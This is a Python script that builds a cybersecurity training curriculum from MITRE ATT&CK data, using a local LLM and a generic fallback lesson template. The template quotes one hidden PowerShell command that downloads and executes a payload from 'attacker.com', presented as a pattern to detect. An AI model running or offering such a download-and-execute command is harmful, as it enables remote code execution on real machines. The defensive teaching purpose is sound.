import json
import requests
import os
import time

# CONFIGURATION
# ---------------------------------------------------------
# Adjusted path to point to enterprise-attack.json in the backend root
SOURCE_FILE = "../../enterprise-attack.json" 
OUTPUT_FILE = "curriculum_data.json"
OLLAMA_URL = "http://localhost:11434/api/generate"
MODEL = "llama3" 
LIMIT_PER_TACTIC = 2 # Set to 0 for ALL techniques

# ---------------------------------------------------------

def load_mitre_data():
    """Reads the raw STIX file to identify Tactics and Techniques."""
    print(f"📂 Loading {SOURCE_FILE}...")
    
    # Resolve absolute path for robustness
    script_dir = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(script_dir, SOURCE_FILE)

    if not os.path.exists(file_path):
        print(f"❌ Error: File not found at {file_path}")
        return [], {}

    with open(file_path, 'r', encoding='utf-8') as f:
        data = json.load(f)

    objects = data.get('objects', [])

    # 1. Get Tactics (Modules)
    tactics = []
    for obj in objects:
        if obj.get('type') == 'x-mitre-tactic':
            external_ref = obj.get('external_references', [{}])[0]
            tactics.append({
                "name": obj.get('name'),
                "x_mitre_shortname": obj.get('x_mitre_shortname'),
                "external_id": external_ref.get('external_id')
            })

    # Sort tactics to make a logical flow
    tactics.sort(key=lambda x: x['name'])

    # 2. Get Techniques (Lessons)
    techniques_map = {t['x_mitre_shortname']: [] for t in tactics}

    for obj in objects:
        if obj.get('type') == 'attack-pattern' and not obj.get('revoked'):
            # Find which tactic this belongs to
            tactic_refs = obj.get('kill_chain_phases', [])
            
            mitre_id = None
            for ref in obj.get('external_references', []):
                 if ref.get('source_name') == 'mitre-attack':
                     mitre_id = ref.get('external_id')
                     break

            if not mitre_id: continue

            for ref in tactic_refs:
                phase = ref.get('phase_name')
                if phase in techniques_map:
                    techniques_map[phase].append({
                        "name": obj.get('name'),
                        "description": obj.get('description', ''),
                        "mitre_id": mitre_id
                    })

    return tactics, techniques_map

def generate_lesson_content(tech_name, tech_desc, is_attack=True):
    """Asks Ollama to write the lesson details."""
    
    if is_attack:
        prompt_context = f'attack technique: "{tech_name}"'
        content_structure = "## Concept (Layman explanation), ## Mechanism (How it works), ## Detection (What to look for), and ### Real-world Example"
    else:
        prompt_context = f'cybersecurity concept: "{tech_name}"'
        content_structure = "## Overview (Simple explanation), ## Key Components (Details), ## Analysis (How to apply this), and ### Industry Standard (Real-world usage)"

    prompt = f"""
    Act as a cybersecurity instructor. Create a detailed lesson for the {prompt_context}.
    Context: {tech_desc[:500]}...
    Return ONLY a JSON object with this exact structure:
    {{
        "title": "A short, action-oriented title",
        "description": "Two sentences explaining the concept.",
        "content": "A full lesson in structured Markdown. Include: {content_structure}. detailed and descriptive",
        "key_indicators": "Key takeaways or specific artifacts to look for."
    }}
    """
    payload = {
        "model": MODEL,
        "prompt": prompt,
        "stream": False,
        "format": "json" 
    }

    try:
        response = requests.post(OLLAMA_URL, json=payload, timeout=30) 
        if response.status_code == 200:
            return json.loads(response.json()['response'])
    except Exception as e:
        # print(f"   ⚠️ AI Error: {e}")
        pass

    # -------------------------------------------------------------------------
    # SUPER RICH FALLBACK CONTENT (Used if AI is offline or times out)
    # -------------------------------------------------------------------------
    print("   ⚠️ Using RICH fallback content engine")
    
    if is_attack:
        content = f"""
## **Concept: {tech_name}**

{tech_name} is a sophisticated technique often employed by adversaries to achieve specific objectives within a target network. In the context of the **MITRE ATT&CK** framework, identifying and understanding this behavior is paramount for a robust defense.

---

### **Mechanism: How It Works**

At a technical level, **{tech_name}** operates by leveraging system features or exploiting vulnerabilities. 

*   **Execution Flow**: The adversary initiates the process, often masking it as legitimate system activity.
*   **System Impact**: It may modify configuration files, spawn new processes, or open network connections.
*   **Persistence**: In many cases, this technique is used to maintain access across restarts.

> **Technical Insight**: 
> ```bash
> # Example of a suspicious command pattern often associated with this technique
> powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload')"
> ```

---

### **Detection Engineering**

To detect **{tech_name}**, security analysts should monitor for the following indicators:

1.  **Process Anomalies**: Look for processes spawned by unusual parents (e.g., `cmd.exe` spawned by `outlook.exe`).
2.  **File Modifications**: Alerts on changes to critical system directories or registry keys.
3.  **Network Artifacts**: Unexpected outbound connections to unknown IP addresses on non-standard ports.

#### **SIGMA Rule Concept**
> *   **Log Source**: Windows Security Logs (Event ID 4688)
> *   **Detection**: CommandLine contains suspicious arguments
> *   **Condition**: Selection AND NOT Filter

---

### **Real-World Context**

This technique has been observed in campaigns by advanced persistent threats (APTs). For example, it was a key component in the [REDACTED] campaign, where it allowed attackers to move laterally without detection for weeks.

*   **Mitigation**: Ensure strict permission models (Principle of Least Privilege) and utilize EDR solutions to block known malicious behavioral patterns.
        """
        key_indicators = "Suspicious process trees, unexpected registry modifications, or unauthorized network connections to external IPs."
    
    else: # Concept / Defensive Topic
        content = f"""
## **Overview: {tech_name}**

**{tech_name}** is a foundational concept in cybersecurity. Mastering this topic provides the necessary context for understanding complex threats and implementing effective defenses.

{tech_desc}

---

### **Key Components**

To fully grasp **{tech_name}**, one must understand its core pillars:

1.  **Strategic Value**: Why do organizations invest in this? It directly reduces risk and exposure.
2.  **Operational Implementation**: How is this applied day-to-day? Through rigorous policy and consistent monitoring.
3.  **Technological Backbone**: The tools and software that enable this capability (e.g., SIEM, EDR, Firewalls).

> **Pro Tip**: Always align your implementation of {tech_name} with business objectives to ensure executive buy-in.

---

### **Analysis & Best Practices**

When analyzing **{tech_name}**, consider the following methodology:

*   **Assessment**: Evaluate the current state.
*   **Gap Analysis**: Identify what is missing vs. industry standards (NIST, ISO).
*   **Remediation**: Implement controls to close gaps.

#### **Common Pitfalls**
*   ignoring the human element.
*   Over-reliance on automated tools without human oversight.
*   Failure to update procedures as the threat landscape evolves.

---

### **Industry Standard Application**

In a modern Security Operations Center (SOC), **{tech_name}** is not just a theory; it is a daily practice.

*   **Metric**: Time to Detect (TTD) and Time to Respond (TTR).
*   **Goal**: Continuous improvement through feedback loops.

> "Security is a process, not a product." - Bruce Schneier
        """
        key_indicators = "Adherence to framework guidelines (NIST/ISO), regular audit reports, and consistent metric tracking."

    return {
        "title": f"Mastering {tech_name}",
        "description": f"A comprehensive guide to {tech_name}, covering theory, execution, and defense.",
        "content": content,
        "key_indicators": key_indicators
    }

def main():
    tactics, tech_map = load_mitre_data()
    
    if not tactics:
        print("❌ No tactics found. Exiting.")
        return

    # Define the 3 Core Paths (Beginner -> Intermediate -> Advanced)
    
    # PATH 1: SOC Fundamentals (Beginner)
    soc_syllabus = [
        {
            "title": "Security Operations Overview",
            "lessons": [
                {"title": "What is a SOC?", "desc": "A comprehensive overview of the Security Operations Center (SOC), its roles, responsibilities, and its critical place in modern defensive posture."},
                {"title": "The SOC Triad: People, Process, Technology", "desc": "Analyzing the three pillars of security operations and how they interact to provide effective defense."}
            ]
        },
        {
            "title": "Core Monitoring Skills",
            "lessons": [
                {"title": "Introduction to SIEM Architecture", "desc": "Understanding how Security Information and Event Management systems collect, parse, and correlate log data."},
                {"title": "Log Analysis 101", "desc": "The art of reading raw logs. Differentiating between normal system noise and indicative patterns of compromise."}
            ]
        }
    ]

    # PATH 2: Network Defense Essentials (Intermediate)
    net_def_syllabus = [
        {
            "title": "Packet Analysis",
            "lessons": [
                {"title": "Anatomy of a TCP Packet", "desc": "Deep dive into TCP headers, flags, and the handshake process to identify anomalies."},
                {"title": "Wireshark Filters for Analysts", "desc": "Mastering display filters to isolate malicious traffic streams effectively."}
            ]
        },
        {
            "title": "Firewall & IDS",
            "lessons": [
                {"title": "Signature vs. Anomaly Detection", "desc": "Comparing detection methodologies used by Intrusion Detection Systems (IDS)."},
                {"title": "Egress Filtering Strategies", "desc": "How to configure firewalls to prevent data exfiltration and C2 beaconing."}
            ]
        }
    ]

    # PATH 3 is MITRE (Advanced) - handled dynamically below

    curriculum = [
        {
            "title": "SOC Fundamentals",
            "slug": "soc-fundamentals",
            "type": "standard",
            "modules": []
        },
        {
            "title": "Network Defense Essentials",
            "slug": "network-defense-essentials",
            "type": "standard",
            "modules": []
        },
        {
            "title": "MITRE ATT&CK Enterprise Mastery",
            "slug": "mitre-enterprise-mastery",
            "type": "standard",
            "modules": []
        }
    ]

    # Helper to populate static paths
    def populate_static_path(path_index, syllabus, prefix):
        for i, mod in enumerate(syllabus, 1):
            module_data = {
                "title": mod["title"],
                "order": i,
                "lessons": []
            }
            print(f"   Processing {prefix} Module: {mod['title']}")
            for j, lesson in enumerate(mod["lessons"], 1):
                 print(f"      Generating: {lesson['title']}")
                 # Force is_attack=False for concepts
                 # Using less rigorous check since we want guaranteed content
                 ai_data = generate_lesson_content(lesson['title'], lesson['desc'], is_attack=False)
                 
                 lesson_data = {
                    "title": lesson['title'],
                    "order": j,
                    "router_link": f"/lessons/{prefix.lower()}-{i}-{j}",
                    "description": lesson['desc'],
                    "content": ai_data.get('content', ''),
                    "key_indicators": ai_data.get('key_indicators', 'Review standard operating procedures and policy docs.'),
                    "mitre_id_link": None 
                }
                 module_data['lessons'].append(lesson_data)
            curriculum[path_index]['modules'].append(module_data)

    print("\n-----------------------------------")
    print("🚀 Generating Path 1: SOC Fundamentals")
    populate_static_path(0, soc_syllabus, "SOC")

    print("\n-----------------------------------")
    print("🚀 Generating Path 2: Network Defense")
    populate_static_path(1, net_def_syllabus, "NET")

    print("\n-----------------------------------")
    print("🚀 Generating Path 3: MITRE ATT&CK")
    
    # Generate MITRE Content (Dynamic)
    for i, tactic in enumerate(tactics, 1):
        shortname = tactic['x_mitre_shortname']
        techs = tech_map.get(shortname, [])

        if LIMIT_PER_TACTIC > 0:
            techs = techs[:LIMIT_PER_TACTIC]

        if not techs: continue

        # print(f"   Processing Tactic: {tactic['name']}")

        module_data = {
            "title": f"{tactic['name']} Tactics",
            "order": i,
            "lessons": []
        }

        for j, tech in enumerate(techs, 1):
            print(f"      Generating: {tech['mitre_id']} - {tech['name']}")
            ai_data = generate_lesson_content(tech['name'], tech['description'], is_attack=True)

            lesson_data = {
                "title": ai_data['title'],
                "order": j,
                "router_link": f"/lessons/{tech['mitre_id'].lower()}",
                "description": ai_data['description'],
                "content": ai_data.get('content', ''),
                "key_indicators": ai_data['key_indicators'],
                "mitre_id_link": tech['mitre_id']
            }
            module_data['lessons'].append(lesson_data)

        curriculum[2]['modules'].append(module_data)

    # Save to file
    script_dir = os.path.dirname(os.path.abspath(__file__))
    output_path = os.path.join(script_dir, OUTPUT_FILE)
    
    print(f"\n💾 Saving to {output_path}...")
    with open(output_path, 'w', encoding='utf-8') as f:
        json.dump(curriculum, f, indent=4)
    print("✅ Done!")

if __name__ == "__main__":
    main()
